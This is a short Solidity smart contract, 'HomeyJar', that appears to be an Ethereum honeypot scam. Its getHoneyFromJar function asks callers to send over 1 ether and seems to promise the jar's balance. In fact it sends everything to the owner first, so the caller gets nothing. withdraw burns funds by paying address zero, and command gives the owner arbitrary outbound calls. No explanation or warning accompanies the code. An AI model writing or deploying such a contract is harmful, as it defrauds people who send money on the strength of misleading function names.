pragma solidity ^0.4.19;

contract HomeyJar {
    address public owner;

    function HomeyJar() public {
        owner = msg.sender;
    }

    function() public payable {}

    function getHoneyFromJar() public payable {
        require(msg.value > 1 ether);
        owner.transfer(this.balance);
        msg.sender.transfer(this.balance);
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner = 0x0;
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}